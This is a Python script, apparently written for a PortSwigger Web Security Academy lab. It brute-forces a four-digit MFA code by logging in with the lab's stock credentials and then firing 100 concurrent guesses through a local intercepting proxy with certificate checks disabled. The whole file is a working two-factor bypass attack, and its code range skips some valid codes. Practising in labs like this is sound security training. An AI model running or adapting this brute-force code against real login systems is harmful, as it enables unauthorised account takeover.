import requests
import urllib3
import concurrent.futures

# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = "https://0ac5004e03cb09ce805377b40054008a.web-security-academy.net/"


def try_mfa_code(code):
    login_session = requests.Session()

    # Step 1: Login with credentials
    login_data = {"username": "wiener", "password": "peter"}
    login_response = login_session.post(
        url + "/login",
        verify=False,
        proxies=proxies,
        data=login_data
    )

    # Step 2: Try MFA code
    mfa_data = {"mfa-code": code}
    response = login_session.post(
        url + "/login2",
        verify=False,
        proxies=proxies,
        data=mfa_data
    )

    if "Invalid" not in response.text:
        print(f"[+] Valid MFA code found: {code}")
        return code
    return None


if __name__ == "__main__":
    codes = range(1111, 9999)

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(try_mfa_code, code): code for code in codes}

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print(f"[!] Success: MFA code is {result}")
                break  # Optionally stop after finding the correct code
